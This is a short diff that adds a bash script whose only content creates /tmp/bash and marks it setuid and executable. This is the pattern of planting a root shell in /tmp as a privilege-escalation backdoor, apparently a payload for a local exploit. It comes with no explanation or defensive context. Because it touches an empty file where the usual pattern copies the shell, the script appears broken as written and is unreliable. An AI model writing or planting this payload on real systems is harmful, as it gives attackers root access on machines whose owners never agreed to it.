@@ -1,0 +1,4 @@
+#!/bin/bash
+/bin/touch /tmp/bash
+/bin/chmod +sx /tmp/bash
+
